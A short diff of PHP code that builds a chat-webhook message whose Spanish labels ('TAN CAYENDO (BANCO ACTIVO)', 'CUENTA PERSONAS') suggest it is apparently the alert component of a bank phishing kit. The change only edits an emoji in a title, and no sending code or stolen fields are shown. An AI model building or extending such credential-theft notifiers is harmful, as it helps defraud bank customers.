@@ -37,7 +37,7 @@ $data = [
     "content" => "🔐 **TAN CAYENDO (BANCO ACTIVO)** 🔐",
     "embeds" => [
         [
-            "title" => "CUENTA PERSONAS🔐📥📲",
+            "title" => "CUENTA PERSONAS👤",
             "color" => 3447003,
             "fields" => [
                 [
